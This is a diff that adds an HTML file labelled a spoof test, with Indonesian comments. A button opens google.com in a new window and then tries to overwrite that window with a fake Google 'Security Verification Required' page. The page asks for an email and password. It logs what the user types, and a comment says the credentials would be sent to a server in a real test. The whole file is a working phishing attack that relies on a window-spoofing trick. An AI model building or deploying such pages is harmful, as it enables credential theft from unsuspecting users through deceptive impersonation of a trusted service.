@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enhanced Spoof Test</title>
+</head>
+<body>
+    <button onclick="testSpoof()">Enhanced Test</button>
+    
+    <script>
+        function testSpoof() {
+            const win = window.open("https://www.google.com", "_blank");
+            
+            setTimeout(() => {
+                try {
+                    // Enhanced spoofing dengan visual yang lebih convincing
+                    win.document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>Google</title>
+                            <link rel="icon" href="https://www.google.com/favicon.ico">
+                            <style>
+                                body { 
+                                    font-family: Arial, sans-serif; 
+                                    max-width: 600px;
+                                    margin: 50px auto;
+                                    padding: 20px;
+                                }
+                                .google-style {
+                                    background: #f8f9fa;
+                                    padding: 20px;
+                                    border-radius: 8px;
+                                    border: 1px solid #dadce0;
+                                }
+                                input {
+                                    width: 90%;
+                                    padding: 12px;
+                                    margin: 10px 0;
+                                    border: 1px solid #dadce0;
+                                    border-radius: 4px;
+                                }
+                                button {
+                                    background: #1a73e8;
+                                    color: white;
+                                    padding: 12px 24px;
+                                    border: none;
+                                    border-radius: 4px;
+                                    cursor: pointer;
+                                }
+                            </style>
+                        </head>
+                        <body>
+                            <div class="google-style">
+                                <h1 style="color: #1a73e8;">Google</h1>
+                                <h3>Security Verification Required</h3>
+                                <p>We've detected unusual activity from your account. Please verify your identity to continue.</p>
+                                
+                                <input type="email" id="email" placeholder="Email or phone">
+                                <input type="password" id="password" placeholder="Enter your password">
+                                
+                                <button onclick="verify()">Verify Identity</button>
+                                <p style="font-size: 12px; color: #5f6368; margin-top: 20px;">
+                                    🔒 Google will never ask for your password outside of google.com
+                                </p>
+                            </div>
+                            
+                            <script>
+                                function verify() {
+                                    const email = document.getElementById('email').value;
+                                    const password = document.getElementById('password').value;
+                                    
+                                    // Simpan credentials (dalam real test, kirim ke server)
+                                    console.log('Captured:', {email: email, password: password});
+                                    
+                                    // Show success message
+                                    alert('Verification complete. Thank you!');
+                                }
+                                
+                                // Tambahkan real-time validation
+                                document.getElementById('email').addEventListener('input', function(e) {
+                                    console.log('Email being typed:', e.target.value);
+                                });
+                                
+                                document.getElementById('password').addEventListener('input', function(e) {
+                                    console.log('Password being typed:', e.target.value.substring(0, 1) + '*'.repeat(e.target.value.length - 1));
+                                });
+                            <\/script>
+                        </body>
+                        </html>
+                    `);
+                    win.document.close();
+                    
+                } catch(e) {
+                    console.log("Error:", e);
+                }
+            }, 200);
+        }
+    </script>
+</body>
+</html>
